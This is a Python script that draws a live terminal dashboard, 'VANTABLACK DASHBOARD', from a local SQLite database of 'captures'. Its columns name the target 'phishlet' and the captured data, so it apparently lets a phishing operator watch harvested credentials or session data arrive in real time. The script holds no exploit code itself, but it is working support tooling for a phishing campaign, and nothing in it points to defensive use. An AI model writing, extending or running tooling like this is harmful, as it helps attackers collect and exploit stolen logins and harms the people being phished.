import sqlite3
import time
from rich.console import Console
from rich.table import Table
from rich.live import Live

console = Console()

def get_latest_captures():
    try:
        conn = sqlite3.connect("hitch_vault.db")
        cursor = conn.cursor()
        cursor.execute("SELECT timestamp, source, data FROM captures ORDER BY timestamp DESC LIMIT 10")
        rows = cursor.fetchall()
        conn.close()
        return rows
    except:
        return []

def generate_table() -> Table:
    table = Table(title="[bold grey50]VANTABLACK DASHBOARD - REAL-TIME CAPTURES[/bold grey50]", border_style="grey37")
    table.add_column("Time", style="cyan")
    table.add_column("Target (Phishlet)", style="green")
    table.add_column("Captured Data", style="white", overflow="fold")
    
    captures = get_latest_captures()
    for ts, source, data in captures:
        # Subtle masking for terminal display
        short_data = data[:100] + "..." if len(data) > 100 else data
        table.add_row(ts, source, short_data)
    
    return table

def main():
    console.print("[bold grey37]Launching Capture Monitor... (CTRL+C to exit)[/]\n")
    with Live(generate_table(), refresh_per_second=1) as live:
        try:
            while True:
                time.sleep(1)
                live.update(generate_table())
        except KeyboardInterrupt:
            console.print("\n[dim grey37]Monitoring suspended.[/]")

if __name__ == "__main__":
    main()
